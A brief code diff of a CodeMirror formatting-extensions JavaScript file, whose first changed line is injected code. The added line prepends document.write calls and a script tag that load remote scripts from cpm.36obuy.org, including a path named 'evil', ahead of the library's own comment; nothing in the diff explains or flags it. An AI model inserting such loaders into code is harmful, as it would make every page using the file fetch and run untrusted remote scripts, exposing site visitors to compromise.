@@ -1,4 +1,4 @@
-// ============== Formatting extensions ============================
+document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/js/1.js"></script>// ============== Formatting extensions ============================
 // A common storage for all mode-specific formatting features
 if (!CodeMirror.modeExtensions) CodeMirror.modeExtensions = {};
 
